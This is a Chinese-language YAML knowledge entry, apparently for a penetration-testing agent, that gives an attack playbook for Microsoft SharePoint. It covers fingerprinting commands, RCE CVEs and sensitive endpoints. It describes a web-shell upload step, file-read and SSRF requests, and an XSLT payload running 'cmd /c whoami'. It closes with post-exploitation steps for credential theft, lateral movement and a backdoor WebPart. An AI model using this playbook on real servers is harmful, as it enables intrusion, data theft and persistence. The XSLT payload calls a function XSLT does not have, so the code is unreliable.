knowledge: |
  # SharePoint攻击

  ## 攻击思路
  ```
  系统识别 → 漏洞探测 → 权限提升 → RCE/数据窃取
  ```

  ## 系统识别

  | 特征 | 值 |
  |------|-----|
  | Title | SharePoint |
  | 路径 | /_layouts/, /sites/, /_api/ |
  | Header | MicrosoftSharePointTeamServices |

  ```bash
  # 识别
  curl -I http://target | grep -i "sharepoint"
  curl http://target/_layouts/15/viewlsts.aspx
  ```

  ## 关键漏洞矩阵

  | CVE | 漏洞类型 | 影响 |
  |-----|----------|------|
  | CVE-2020-0932 | RCE | 远程代码执行 |
  | CVE-2020-0603 | RCE | 反序列化RCE |
  | CVE-2019-0604 | RCE | ViewState反序列化 |
  | CVE-2021-27076 | RCE | SharePoint RCE |

  ## 敏感端点

  | 端点 | 用途 |
  |------|------|
  /_layouts/15/upload.aspx | 文件上传 |
  /_api/web/GetFileByServerRelativeUrl | 文件读取 |
  /_vti_bin/_vti_aut/author.dll | FrontPage扩展 |
  /_layouts/15/listedit.aspx | 列表管理 |
  /sites/dev/SiteAssets/ | 资源文件 |

  ### 文件读取
  ```bash
  # API读取文件
  GET /_api/web/GetFileByServerRelativeUrl('/sites/main/config.txt')

  # 直接访问
  GET /sites/dev/SiteAssets/test.txt
  ```

  ### 文件上传攻击
  ```bash
  # 上传恶意文件
  POST /_layouts/15/upload.aspx
  Content-Type: multipart/form-data

  # 上传.aspx WebShell
  ```

  ## SSRF攻击

  ```bash
  # 利用SharePoint API触发SSRF
  POST /_api/web/urls

  # 或通过特定功能点
  /_layouts/15/help.aspx
  ```

  ## SSTI攻击

  ```
  # SharePoint使用XSLT模板
  注入恶意模板语法 → 服务端执行

  # Payload示例
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <xsl:value-of select="system('cmd /c whoami')"/>
    </xsl:template>
  </xsl:stylesheet>
  ```

  ## 信息收集

  | 目标 | 端点/方法 |
  |------|-----------|
  | 用户枚举 | /_layouts/15/people.aspx |
  | 站点列表 | /_layouts/15/viewlsts.aspx |
  | 权限信息 | /_api/web/RoleAssignments |
  | 版本信息 | 响应头X-SharePointVersion |

  ## 权限提升

  ```
  1. 低权限用户 → 枚举可访问站点
  2. 寻找配置错误的权限设置
  3. 修改列表权限获取更高访问权限
  4. 上传恶意代码获取执行权限
  ```

  ## 后渗透利用

  | 操作 | 方法 |
  |------|------|
  | 凭据窃取 | 数据库连接字符串/配置文件 |
  | 横向移动 | SharePoint与AD集成 |
  | 持久化 | 后门WebPart |